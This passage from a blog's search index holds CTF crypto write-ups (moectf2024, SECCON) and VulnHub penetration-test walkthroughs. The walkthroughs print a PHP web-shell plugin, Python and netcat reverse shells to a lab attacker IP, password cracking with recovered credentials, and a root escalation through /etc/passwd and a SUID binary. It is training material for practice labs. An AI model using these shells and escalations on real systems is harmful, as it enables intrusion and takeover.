(a1+(2**(511-k)))*(b1+(2**(511-k))) \u003c n: continue if ((a1*b1)%(2**(k+1))) != (n%(2**(k+1))): continue t(a1, b1, k+1) for i in range(2): t(i*(2**256), i*(2**256), 0) p=12119998731259483292178496920109290754181396164390285597126378297678818779092115139911720576157973310671490865211601201831597946479039132512609504866583931 q=11660635291534613230423193509391946961264539191735481147071890944740311229658362673314192872117237108949853531941630122241060679012089130178372253390640871 c=47886145637416465474967586561554275347396273686722042112754589742652411190694422563845157055397690806283389102421131949492150512820301748529122456307491407924640312270962219946993529007414812671985960186335307490596107298906467618684990500775058344576523751336171093010950665199612378376864378029545530793597 from Crypto.Util.number import * n=p*q phi=(p-1)*(q-1) d=inverse(65537,phi) m=pow(c,d,n) print(long_to_bytes(m)) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:10","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"One more bit task from Crypto.Util.number import getStrongPrime, bytes_to_long, GCD, inverse from Crypto.Util.Padding import pad from secret import flag import random def genKey(nbits,dbits): p = getStrongPrime(nbits//2) q = getStrongPrime(nbits//2) n = p*q phi = (p-1)*(q-1) while True: d = random.getrandbits(dbits) if d.bit_length() == dbits: if GCD(d, phi) == 1: e = inverse(d, phi) pk = (n, e) sk = (p, q, d) return pk, sk nbits = 1024 dbits = 258 message = pad(flag,16) msg = pad(message, 16) m = bytes_to_long(msg) pk= genKey(nbits, dbits)[0] n, e = pk ciphertext = pow(m, e, n) with open(\"data.txt\",\"w\") as f: f.write(f\"pk = {pk}\\n\") f.write(f\"ciphertext = {ciphertext}\\n\") f.close() 思路 Boneh_Durfee攻击的板子题 exp 省略 ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:11","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"EzPack task from Crypto.Util.number import * from secret import flag import random p = 2050446265000552948792079248541986570794560388346670845037360320379574792744856498763181701382659864976718683844252858211123523214530581897113968018397826268834076569364339813627884756499465068203125112750486486807221544715872861263738186430034771887175398652172387692870928081940083735448965507812844169983643977 assert len(flag) == 42 def encode(msg): return bin(bytes_to_long(msg))[2:].zfill(8*len(msg)) def genkey(len): sums = 0 keys = [] for i in range(len): k = random.randint(1,7777) x = sums + k keys.append(x) sums += x return keys key = genkey(42*8) def enc(m, keys): msg = encode(m) print(len(keys)) print(len(msg)) assert len(msg) == len(keys) s = sum((k if (int(p,2) == 1) else 1) for p, k in zip(msg, keys)) print(msg) for p0,k in zip(msg,keys): print(int(p0,2)) return pow(7,s,p) cipher = enc(flag,key) with open(\"output.txt\", \"w\") as fs: fs.write(str(key)+'\\n') fs.write(str(cipher)) 思路 p-1是光滑的，直接DLP，然后背包,数据太大了，不写了 exp from Crypto.Util.number import* from sympy import discrete_log #pow(7,s,p) s=363965742933281351259442199216117822475210003294088371760914916341815880641228470807683148775152284520244 decoded_bits = [] for k in reversed(key): if s \u003e= k: decoded_bits.append('1') s -= k else: decoded_bits.append('0') decoded_bits = ''.join(reversed(decoded_bits)) flag = long_to_bytes(int(decoded_bits, 2)) print(flag) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:12","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"EzMatrix task from Crypto.Util.number import * from secret import FLAG,secrets,SECERT_T assert len(secrets) == 16 assert FLAG == b'moectf{' + secrets + b'}' assert len(SECERT_T) \u003c= 127 class LFSR: def __init__(self): self._s = list(map(int,list(\"{:0128b}\".format(bytes_to_long(secrets))))) for _ in range(8*len(secrets)): self.clock() def clock(self): b = self._s[0] c = 0 for t in SECERT_T:c ^= self._s[t] self._s = self._s[1:] + [c] return b def stream(self, length): return [self.clock() for _ in range(length)] c = LFSR() stream = c.stream(256) print(\"\".join(map(str,stream))[:-5]) # 11111110011011010000110110100011110110110101111000101011001010110011110011000011110001101011001100000011011101110000111001100111011100010111001100111101010011000110110101011101100001010101011011101000110001111110100000011110010011010010100100000000110 思路 lfsr每次生成一位都会形成一个方程 $$ mask*state_i=state_{i+1} $$根据条件，一共有123组方程，然后反解出mask exp from Crypto.Util.number import * from gmpy2 import* def xor(a,b): res=0 for i,j in zip(a,b): if j==1: res^=int(i) return res def rev(stream,mask): temp = [0] + stream[:-1] if xor(temp, mask) == stream[-1]: return temp temp = [1] + stream[:-1] if xor(temp, mask) == stream[-1]: return temp return None lfsr_stream='11111110011011010000110110100011110110110101111000101011001010110011110011000011110001101011001100000011011101110000111001100111011100010111001100111101010011000110110101011101100001010101011011101000110001111110100000011110010011010010100100000000110' M=matrix(Zmod(2),0,128) for i in range(len(lfsr_stream)-128): v=vector([int(x) for x in lfsr_stream[i:i+128]]) M=M.stack(v) res=vector(Zmod(2), [int(x) for x in lfsr_stream[128:]]) mask = M.solve_right(res) for k in range(5): stream = [int(x) for x in lfsr_stream[:128]] for idx in range(16 * 8): tmp = rev(stream, list(mask)) if tmp is None: break stream = tmp flag=int(''.join([str(x) for x in stream]), 2) print(long_to_bytes(flag)) mask += M.right_kernel().basis()[k] ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:13","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"hidden_poly task from Crypto.Util.Padding import pad from Crypto.Util.number import * from Crypto.Cipher import AES import os q = 264273181570520944116363476632762225021 key = os.urandom(16) iv = os.urandom(16) root = 122536272320154909907460423807891938232 f = sum([a*root**i for i,a in enumerate(key)]) assert key.isascii() assert f % q == 0 with open('flag.txt','rb') as f: flag = f.read() cipher = AES.new(key,AES.MODE_CBC, iv) ciphertext = cipher.encrypt(pad(flag,16)).hex() with open('output.txt','w') as f: f.write(f\"{iv = }\" + \"\\n\") f.write(f\"{ciphertext = }\" + \"\\n\") 思路 $$ \\sum_{i} a_i*root^i=0\\mod p $$其中$a_i$都是0到128，很小，那么就可以写成 $$ (a_1,···,a_15,1)L=(a_1,···,a_15,a_0) \\\\ L= \\begin{pmatrix} 1 \u0026 \u0026 root \\\\ \u0026· \u0026· \\\\ \u00261\u0026 root^{15} \\\\ \u0026\u0026 q \\end{pmatrix} $$直接LLL就行了 exp iv = b'Gc\\xf2\\xfd\\x94\\xdc\\xc8\\xbb\\xf4\\x84\\xb1\\xfd\\x96\\xcd6\\\\' ciphertext ='d23eac665cdb57a8ae7764bb4497eb2f79729537e596600ded7a068c407e67ea75e6d76eb9e23e21634b84a96424130e' q = 264273181570520944116363476632762225021 root = 122536272320154909907460423807891938232 from Crypto.Util.number import * from Crypto.Cipher import AES L = Matrix(ZZ, 16, 16) for i in range(16 - 1): L[i, i] = 1 L[i, 15] = root ** (i + 1) L[-1, -1] = q L = L.LLL() for res in L: tmp = [] for idx in res: tmp.append(int(abs(idx))) tmp = [tmp[-1]] + tmp[:-1] if all(0 \u003c x \u003c 128 for x in tmp): key = bytearray([x for x in tmp]) cipher = AES.new(key,AES.MODE_CBC, iv) flag = cipher.decrypt(long_to_bytes(int(ciphertext, 16))) print(flag) ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:14","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"babe-Lifting from Crypto.Util.number import * from secret import flag p = getPrime(512) q = getPrime(512) n = p*q e = 0x1001 d = inverse(e, (p-1)*(q-1)) bit_leak = 400 d_leak = d \u0026 ((1\u003c\u003cbit_leak)-1) msg = bytes_to_long(flag) cipher = pow(msg,e,n) pk = (n, e) with open('output.txt','w') as f: f.write(f\"pk = {pk}\\n\") f.write(f\"cipher = {cipher}\\n\") f.write(f\"hint = {d_leak}\\n\") f.close() n,e = (53282434320648520638797489235916411774754088938038649364676595382708882567582074768467750091758871986943425295325684397148357683679972957390367050797096129400800737430005406586421368399203345142990796139798355888856700153024507788780229752591276439736039630358687617540130010809829171308760432760545372777123, 4097) cipher = 14615370570055065930014711673507863471799103656443111041437374352195976523098242549568514149286911564703856030770733394303895224311305717058669800588144055600432004216871763513804811217695900972286301248213735105234803253084265599843829792871483051020532819945635641611821829176170902766901550045863639612054 hint = 1550452349150409256147460237724995145109078733341405037037945312861833198753379389784394833566301246926188176937280242129 思路 d的低位泄露板子 exp from Crypto.Util.number import long_to_bytes,inverse n,e = (53282434320648520638797489235916411774754088938038649364676595382708882567582074768467750091758871986943425295325684397148357683679972957390367050797096129400800737430005406586421368399203345142990796139798355888856700153024507788780229752591276439736039630358687617540130010809829171308760432760545372777123, 4097) c = 14615370570055065930014711673507863471799103656443111041437374352195976523098242549568514149286911564703856030770733394303895224311305717058669800588144055600432004216871763513804811217695900972286301248213735105234803253084265599843829792871483051020532819945635641611821829176170902766901550045863639612054 dlow = 1550452349150409256147460237724995145109078733341405037037945312861833198753379389784394833566301246926188176937280242129 def get_full_p(p_low,n,pbits): kbits = p_low.bit_length() R.\u003cx\u003e = PolynomialRing(Zmod(n)) f = x * 2^kbits + p_low f = f.monic() res = f.small_roots(X = 2^(pbits-kbits),beta=0.4) if res != []: p = int(res[0]) * 2^kbits + p_low return p for k in range(e): var('p') f1 = e*dlow*p - (k*n*p - k*p^2 - k*n + (k+1)*p) roots = solve_mod(f1,2^400) if roots != []: for root in roots: if int(root[0]).bit_length() == 400: p = get_full_p(int(root[0]),n,512) if p: q = n // p d = inverse(e,(p-1)*(q-1)) m = pow(c,d,n) print(long_to_bytes(m)) break ","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:15","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["CTF"],"content":"ezLCG task from sage.all import * from random import getrandbits, randint from secrets import randbelow from Crypto.Util.number import getPrime,isPrime,inverse from Crypto.Util.Padding import pad from Crypto.Cipher import AES from secret import priKey, flag from hashlib import sha1 import os q = getPrime(160) while True: t0 = q*getrandbits(864) if isPrime(t0+1): p = t0 + 1 break x = priKey assert p % q == 1 h = randint(1,p-1) g = pow(h,(p-1)//q,p) y = pow(g,x,p) def sign(z, k): r = pow(g,k,p) % q s = (inverse(k,q)*(z+r*priKey)) % q return (r,s) def verify(m,s,r): z = int.from_bytes(sha1(m).digest(), 'big') u1 = (inverse(s,q)*z) % q u2 = (inverse(s,q)*r) % q r0 = ((pow(g,u1,p)*pow(y,u2,p)) % p) % q return r0 == r def lcg(a, b, q, x): while True: x = (a * x + b) % q yield x msg = [os.urandom(16) for i in range(5)] a, b, x = [randbelow(q) for _ in range(3)] prng = lcg(a, b, q, x) sigs = [] for m, k in zip(msg,prng): z = int.from_bytes(sha1(m).digest(), \"big\") % q r, s = sign(z, k) assert verify(m, s, r) sigs.append((r,s)) print(f\"{g = }\") print(f\"{h = }\") print(f\"{q = }\") print(f\"{p = }\") print(f\"{msg = }\") print(f\"{sigs = }\") key = sha1(str(priKey).encode()).digest()[:16] iv = os.urandom(16) cipher = AES.new(key, AES.MODE_CBC,iv) ct = cipher.encrypt(pad(flag,16)) print(f\"{iv = }\") print(f\"{ct = }\") ''' g = 81569684196645348869992756399797937971436996812346070571468655785762437078898141875334855024163673443340626854915520114728947696423441493858938345078236621180324085934092037313264170158390556505922997447268262289413542862021771393535087410035145796654466502374252061871227164352744675750669230756678480403551 h = 13360659280755238232904342818943446234394025788199830559222919690197648501739683227053179022521444870802363019867146013415532648906174842607370958566866152133141600828695657346665923432059572078189013989803088047702130843109809724983853650634669946823993666248096402349533564966478014376877154404963309438891 q = 1303803697251710037027345981217373884089065173721 p = 135386571420682237420633670579115261427110680959831458510661651985522155814624783887385220768310381778722922186771694358185961218902544998325115481951071052630790578356532158887162956411742570802131927372034113509208643043526086803989709252621829703679985669846412125110620244866047891680775125948940542426381 msg = [b'I\\xf0\\xccy\\xd5~\\xed\\xf8A\\xe4\\xdf\\x91+\\xd4_$', b'~\\xa0\\x9bCB\\xef\\xc3SY4W\\xf9Aa\\rO', b'\\xe6\\x96\\xf4\\xac\\n9\\xa7\\xc4\\xef\\x82S\\xe9 XpJ', b'3,\\xbb\\xe2-\\xcc\\xa1o\\xe6\\x93+\\xe8\\xea=\\x17\\xd1', b'\\x8c\\x19PHN\\xa8\\xbc\\xfc\\xa20r\\xe5\\x0bMwJ'] sigs = [(913082810060387697659458045074628688804323008021, 601727298768376770098471394299356176250915124698), (406607720394287512952923256499351875907319590223, 946312910102100744958283218486828279657252761118), (1053968308548067185640057861411672512429603583019, 1284314986796793233060997182105901455285337520635), (878633001726272206179866067197006713383715110096, 1117986485818472813081237963762660460310066865326), (144589405182012718667990046652227725217611617110, 1028458755419859011294952635587376476938670485840)] iv = b'M\\xdf\\x0e\\x7f\\xeaj\\x17PE\\x97\\x8e\\xee\\xaf:\\xa0\\xc7' ct = b\"\\xa8a\\xff\\xf1[(\\x7f\\xf9\\x93\\xeb0J\\xc43\\x99\\xb25:\\xf5\u003e\\x1c?\\xbd\\x8a\\xcd)i)\\xdd\\x87l1\\xf5L\\xc5\\xc5'N\\x18\\x8d\\xa5\\x9e\\x84\\xfe\\x80\\x9dm\\xcc\" ''' from sage.all import * from random import getrandbits, randint from secrets import randbelow from Crypto.Util.number import getPrime,isPrime,inverse from Crypto.Util.Padding import pad from Crypto.Cipher import AES from secret import priKey, flag from hashlib import sha1 import os q = getPrime(160) while True: t0 = q*getrandbits(864) if isPrime(t0+1): p = t0 + 1 break x = priKey assert p % q == 1 h = randint(1,p-1) g = pow(h,(p-1)//q,p) y = pow(g,x,p) def sign(z, k): r = pow(g,k,p) % q s = (inverse(k,q)*(z+r*priKey)) % q return (r,s) def verify(m,s,r): z = int.from_bytes(sha1(m).digest(), 'big') u1 = (inverse(s,q)*z) % q u2 = (inverse(s,q)*r) % q r0 = ((pow(g,u1,p)*pow(y,u2,p)) % p) % q return r0 == r def lcg(","date":"2024-12-12","objectID":"/moectf2024_crypto/:1:16","tags":["crypto"],"title":"moectf2024_crypto","uri":"/moectf2024_crypto/"},{"categories":["靶场"],"content":"AdmX_new ","date":"2024-12-12","objectID":"/vuln_hmv2/:1:0","tags":["渗透"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["靶场"],"content":"靶场链接 https://download.vulnhub.com/admx/AdmX_new.7z ","date":"2024-12-12","objectID":"/vuln_hmv2/:1:1","tags":["渗透"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["靶场"],"content":"日常扫描 只有80端口开放，直接访问没什么东西，dirb扫描出来wordpress，访问看看，发现很慢，burp抓包发现重定向到192.168.159.145 ","date":"2024-12-12","objectID":"/vuln_hmv2/:1:2","tags":["渗透"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["靶场"],"content":"getshell wordpress的后台登陆在wp-login.php,爆破账号密码得到admin/adam14,进入后台第一时间想着图片马传上去，然后蚁剑连接，结果一直失败，后面发现可以传插件，打包成zip传上去 \u003c?php if(isset($_GET['cmd'])) { system($_GET['cmd']); } ?\u003e 尝试访问http://192.168.64.9/wordpress/wp-content/plugins/wordpress_getshell.php?cmd=id 哎，可以执行，尝试python反弹shell python3 -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.64.3”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")’ ","date":"2024-12-12","objectID":"/vuln_hmv2/:1:3","tags":["渗透"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["靶场"],"content":"提权 成功之后sudo -l看看文件执行权限，发现 直接执行这个， 成功拿到root ","date":"2024-12-12","objectID":"/vuln_hmv2/:1:4","tags":["渗透"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["靶场"],"content":"Empire_LupinOne ","date":"2024-12-12","objectID":"/vuln_hmv2/:2:0","tags":["渗透"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["靶场"],"content":"靶场链接 https://www.vulnhub.com/entry/empire-lupinone,750/ ","date":"2024-12-12","objectID":"/vuln_hmv2/:2:1","tags":["渗透"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["靶场"],"content":"扫描 访问80端口看看 一个图片，源码里面也什么都没有 dirb直接扫目录啥都没有，robots.txt里面有一个 但是访问这个页面又是一个404,在旧版本的Apache服务器中，~ 指代用户主目录，可以用fuzz进行测试 wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/common.txt –hc 403,404 http://192.168.64.15/~FUZZ 扫描出来secret页面， 大概发现是有个账号，还缺一个密码，在这个下面继续探测 wfuzz -c -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt –hc 404,403 -u http://192.168.64.15/~secret/.FUZZ.txt 发现.mysecret.txt，访问一下 ","date":"2024-12-12","objectID":"/vuln_hmv2/:2:2","tags":["渗透"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["靶场"],"content":"getshell 估计就是ssh的密钥，不过被简单的加密了，扔厨子里面，base58直接出来 返回kali，vim一个sshkey，扔进去，然后用join暴力破解 /usr/share/john/ssh2john.py sshkey \u003e hash john –wordlist=/usr/share/wordlists/fasttrack.txt hash 得到密码P@55w0rd! ","date":"2024-12-12","objectID":"/vuln_hmv2/:2:3","tags":["渗透"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["靶场"],"content":"提权 sudo -l看看 大概是自己写了个python库，然后这个python文件可以执行他，而且是另一个号的权限，那么就可以通过这个提权， find /usr/ -name ‘webbrowser’ /usr/lib/python3.9/webbrowser.py 往里面写一个binsh试试（这个靶机怎么vim都没有啊啊） 执行之后确实提升权限了，但是还不是root，再来sudo -l一下，发现可以执行pip，直接pip提权 这个时候就结束了 ","date":"2024-12-12","objectID":"/vuln_hmv2/:2:4","tags":["渗透"],"title":"Vuln AdmX_new \u0026 Empire_LupinOne","uri":"/vuln_hmv2/"},{"categories":["靶场"],"content":"EvilBox: One ","date":"2024-12-12","objectID":"/vuln_hmv1/:1:0","tags":["渗透"],"title":"Vuln EvilBox: One \u0026 BoredHackerBlog_Cloud_AV","uri":"/vuln_hmv1/"},{"categories":["靶场"],"content":"靶场链接 https://www.vulnhub.com/entry/evilbox-one,736/ 日常扫描 发现这玩意靶机（这个需要自己配置一下网卡） nmap扫描端口 没有用，dis或者是dirb扫一下 发现这几个，一个一个点进去看一眼，http://192.168.64.4/secret/ 网页是纯白的， 爆破 扫一下尾缀发现真有.php，bp抓包看一下 用fuzz爆破一下， 发现 mowree❌1000:1000:mowree,,,:/home/mowree:/bin/bash 可能是ssh的用户，页面上去看一样是密码，gpt格式化一下 john去爆破私钥 python /usr/share/john/ssh2john.py id_rsa \u003e hash john hash 得到密码是unicorn ssh提权 ssh上去 发现/etc/passwd可以修改，直接openssl passwd -1生成密码，然后把root后面的x改了，还有一个方法可以用https://blog.csdn.net/weixin_46700042/article/details/108813878 linpeas过两天考完试再学学怎么用（） ","date":"2024-12-12","objectID":"/vuln_hmv1/:1:1","tags":["渗透"],"title":"Vuln EvilBox: One \u0026 BoredHackerBlog_Cloud_AV","uri":"/vuln_hmv1/"},{"categories":["靶场"],"content":"BoredHackerBlog_Cloud_AV ","date":"2024-12-12","objectID":"/vuln_hmv1/:2:0","tags":["渗透"],"title":"Vuln EvilBox: One \u0026 BoredHackerBlog_Cloud_AV","uri":"/vuln_hmv1/"},{"categories":["靶场"],"content":"靶场链接 https://www.vulnhub.com/entry/boredhackerblog-cloud-av,453/ 日常扫描 发现靶机，nmap启动 有个http服务页面，上去看一眼 sql注入/密码爆破 登陆框页面，sql注入/密码爆破都可以，当然了，身为密码手，直接弱密钥试试，password直接进去了（） 反弹shell 里面还有个框，试一下管道符拼接，没啥用，有python，直接反弹shell扔进去 1|python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((“192.168.64.3”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);’ 本地开nc监听一下 有个.app和.sql，可能是账号密码什么的，直接拉取到本地 发现是密码，靶机有22端口，看看能不能ssh，尝试爆破后没有用 查了一下应该是suid提权（） find / -perm /4000 -type f 2\u003e/dev/null 发现scanner这个，刚才用过，可能还是在这里，进入文件夹，看一下权限 发现root了，甚至有个.c文件，看看 #include \u003cstdio.h\u003e int main(int argc, char *argv[]) { char *freshclam=\"/usr/bin/freshclam\"; if (argc \u003c 2){ printf(\"This tool lets you update antivirus rules\\nPlease supply command line arguments for freshclam\\n\"); return 1; } char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2); sprintf(command, \"%s %s\", freshclam, argv[1]); setgid(0); setuid(0); system(command); return 0; } 我们需要注意的是ClamAV是一个linux的病毒扫描软件。freshclam相当于是一个更新clamav的病毒库的功能。同时对输入的参数进行的长度的限制，同时要求必须有参数的传入。这玩意参数会扔到system执行，那么反弹shell试试 ./update_cloudav “aasff | nc 192.168.64.3 5000 | /bin/bash | nc 192.168.64.3 6000” 连上去之后发现是root ","date":"2024-12-12","objectID":"/vuln_hmv1/:2:1","tags":["渗透"],"title":"Vuln EvilBox: One \u0026 BoredHackerBlog_Cloud_AV","uri":"/vuln_hmv1/"},{"categories":["CTF"],"content":"前言 为什么要这样搞呢，主要是自己太闲了（被打），还是因为win环境下的sagemath版本低，bug多，而且还不能pwn交互，虽然在vm里面可以搞，但是我又嫌打开虚拟机麻烦，所以就wsl2了。 ","date":"2024-12-12","objectID":"/wsl2-arch-sagemath/:1:0","tags":["crypto"],"title":"wsl2 + arch + sagemath","uri":"/wsl2-arch-sagemath/"},{"categories":["CTF"],"content":"安装wsl+arch 在此推荐这个视频教学，主要的步骤就是以下几步（我是win11） 1.控制面板→程序→启用或关闭Windows功能→打开适用于Linux的Windows子系统→重启。 tips:如果没有成功，可以去看看是否开了管理员权限 2.打开powershell→输入：wsl –install –no-distribution→wsl –update tips:--no-distribution作用是安装wsl时不安装linux发行版，如果不加的话会默认安装乌班图 3.打开c盘→用户→个人文件夹→创建文本文件（不要加后缀）→命名.wslconfig→编辑输入 [experimental] autoMemoryReclaim=gradual networkingMode=mirrored dnsTunneling=true firewall=true autoProxy=true 4.下载archlinux，链接，下载zip文件，压缩到本地，记住压缩到新建文件夹里面，我命名为arch 5.直接双击arch.exe 6.进行身份注册，现在默认是root，输入passwd设置密码 7.设置个常用账户输入 echo \"%wheel ALL=(ALL)ALL\"/etc/sudoers.d/wheel useradd -m-G wheel-s /bin/bash fusername Arch.exe config --default-user fusername 退出之后重进 8.配置 sudo pacman-key --init sudo pacman-key --populate sudo pacman -Syy archlinux-keyring 9.换源，推荐清华源 sudo nano /etc/pacman.d/mirrorlist 在最前面直接加上 Server = https://mirrors.tuna.tsinghua.edu.cn/archlinux/$repo/os/$arch 然后ctrl+s，ctrl+x退出 ","date":"2024-12-12","objectID":"/wsl2-arch-sagemath/:2:0","tags":["crypto"],"title":"wsl2 + arch + sagemath","uri":"/wsl2-arch-sagemath/"},{"categories":["CTF"],"content":"安装以及调用sagemath ","date":"2024-12-12","objectID":"/wsl2-arch-sagemath/:3:0","tags":["crypto"],"title":"wsl2 + arch + sagemath","uri":"/wsl2-arch-sagemath/"},{"categories":["CTF"],"content":"安装 输入 sudo pacman -Sy sagemath 安装之后sage调用，看看能不能出来，可以的话就成功了 安装第三方库的命令是 pacman -S python-xyz ","date":"2024-12-12","objectID":"/wsl2-arch-sagemath/:3:1","tags":["crypto"],"title":"wsl2 + arch + sagemath","uri":"/wsl2-arch-sagemath/"},{"categories":["CTF"],"content":"调用 推荐方法vscode vscode左下角有个蓝色方块，点击后连接wsl，如果要下载插件直接下就行了，调出终端，输入 mkdir sage，去新建一个文件夹，进入这个文件夹后新建一个文件，例如1.ipynb（后缀只能是这个），然后会下载插件，全部下载完后右上角选择内核，输入sage的代码看看能不能用，能用就行 ","date":"2024-12-12","objectID":"/wsl2-arch-sagemath/:3:2","tags":["crypto"],"title":"wsl2 + arch + sagemath","uri":"/wsl2-arch-sagemath/"},{"categories":["CTF"],"content":"前言 打了香港，日本的比赛，还有蜀道山，感觉这几个题都很好，但是都不会（），写个记录一下，顺便总结 ","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:1:0","tags":["crypto"],"title":"串烧_crypto复现","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"题目 ","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:2:0","tags":["crypto"],"title":"串烧_crypto复现","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"seccon/reiwa_rot13 task from Crypto.Util.number import * import codecs import string import random import hashlib from Crypto.Cipher import AES from Crypto.Random import get_random_bytes from flag import flag p = getStrongPrime(512) q = getStrongPrime(512) n = p*q e = 137 key = ''.join(random.sample(string.ascii_lowercase, 10)) rot13_key = codecs.encode(key, 'rot13') key = key.encode() rot13_key = rot13_key.encode() print(\"n =\", n) print(\"e =\", e) print(\"c1 =\", pow(bytes_to_long(key), e, n)) print(\"c2 =\", pow(bytes_to_long(rot13_key), e, n)) key = hashlib.sha256(key).digest() cipher = AES.new(key, AES.MODE_ECB) print(\"encyprted_flag = \", cipher.encrypt(flag)) 思路： 当时比赛第一眼看过去，e很小，就在想是不是富兰克林，然后想利用rot13的性质去写，发现没用，然后就想通过c1和c2直接去构造富兰克林攻击，发现一直不对。 正确想法应该是bytes_to_long转换的时候形成的富兰克林，每一位可以看作 $$256^i$$，然后相加，害蠢了。 exp from Crypto.Util.number import * import hashlib import itertools from tqdm import tqdm from Crypto.Cipher import AES n = 105270965659728963158005445847489568338624133794432049687688451306125971661031124713900002127418051522303660944175125387034394970179832138699578691141567745433869339567075081508781037210053642143165403433797282755555668756795483577896703080883972479419729546081868838801222887486792028810888791562604036658927 e = 137 c1 = 16725879353360743225730316963034204726319861040005120594887234855326369831320755783193769090051590949825166249781272646922803585636193915974651774390260491016720214140633640783231543045598365485211028668510203305809438787364463227009966174262553328694926283315238194084123468757122106412580182773221207234679 c2 = 54707765286024193032187360617061494734604811486186903189763791054142827180860557148652470696909890077875431762633703093692649645204708548602818564932535214931099060428833400560189627416590019522535730804324469881327808667775412214400027813470331712844449900828912439270590227229668374597433444897899112329233 encyprted_flag = b\"\\xdb'\\x0bL\\x0f\\xca\\x16\\xf5\\x17\u003e\\xad\\xfc\\xe2\\x10$(DVsDS~\\xd3v\\xe2\\x86T\\xb1{xL\\xe53s\\x90\\x14\\xfd\\xe7\\xdb\\xddf\\x1fx\\xa3\\xfc3\\xcb\\xb5~\\x01\\x9c\\x91w\\xa6\\x03\\x80\u0026\\xdb\\x19xu\\xedh\\xe4\" def franklinReiter(n,e,r,c1,c2): R.\u003cX\u003e = Zmod(n)[] f1 = X^e - c1 f2 = (X + r)^e - c2 return Integer(n-(gcd(f1,f2)).coefficients()[0]) def gcd(a, b): if(b == 0): return a.monic() else: return gcd(b, a % b) def gen(): for perm in itertools.product([13,-13],repeat=10): l = sum([256**i*per for i,per in enumerate(perm)]) yield l for val in tqdm(gen()): m = franklinReiter(n,e,val,c1,c2) try: m = long_to_bytes(m).decode() print(m) break except: continue key = hashlib.sha256(m.encode()).digest() cipher = AES.new(key, AES.MODE_ECB) print(\"encyprted_flag = \", cipher.decrypt(encyprted_flag)) ","date":"2024-12-12","objectID":"/%E4%B8%B2%E7%83%A7_crypto/:2:1","tags":["crypto"],"title":"串烧_crypto复现","uri":"/%E4%B8%B2%E7%83%A7_crypto/"},{"categories":["CTF"],"content":"seccon/dual_summon task from Crypto.Cipher import AES import secrets import os import signal signal.alarm(300) flag = os.getenv('flag', \"SECCON{sample}\") keys = [secrets.token_bytes(16) for _ in range(2)] nonce = secrets.token_bytes(16) def summon(number, plaintext): assert len(plaintext) == 16 aes = AES.new(key=keys[number-1], mode=AES.MODE_GCM, nonce=nonce) ct, tag = aes.encrypt_and_digest(plaintext) return ct, tag # When you can exec dual_summon, you will win def dual_summon(plaintext): assert len(plaintext) == 16 aes1 = AES.new(key=keys[0], mode=AES.MODE_GCM, nonce=nonce) aes2 = AES.new(key=keys[1], mode=AES.MODE_GCM, nonce=nonce) ct1, tag1 = aes1.encrypt_and_digest(plaintext) ct2, tag2 = aes2.encrypt_and_digest(plaintext) # When using dual_summon you have to match tags assert tag1 == tag2 print(\"Welcome to summoning circle. Can you dual summon?\") for _ in range(10): mode = int(input(\"[1] summon, [2] dual summon \u003e\")) if mode == 1: number = int(input(\"summon number (1 or 2) \u003e\")) name = bytes.fromhex(input(\"name of sacrifice (hex) \u003e\")) ct, tag = summon(number, name) print(f\"monster name = [---filtered---]\") print(f\"tag(hex) = {tag.hex()}\") if mode == 2: name = bytes.fromhex(input(\"name of sacrifice (hex) \u003e\")) dual_summon(name) print(\"Wow! you could exec dual_summon! you are master of summoner!\") print(flag) 思路： 首先是在 $$x^{128}+x^7+x^2+x+1$$定义在 $$GF(2^{128})$$上的多项式，AES-GCM生成的标签是 $$T=(P+H_1)*H+H_0$$,H又是和notion绑定的，即notion一样生成的一样，所以我发两个一样的，生成的 $$T^',T$$区别就在于P，那么 $$T+T^'=(P+P^')*H$$,那么H就出来了，草，为什么我当时没想到！！！ e x p import pwn from sage.all import * pwn.context(encoding='ascii') if pwn.args.LOCAL: io = pwn.process(['python', 'server.py']) else: io = pwn.remote('dual-summon.seccon.games', '2222') var('x') F = GF(2**128, 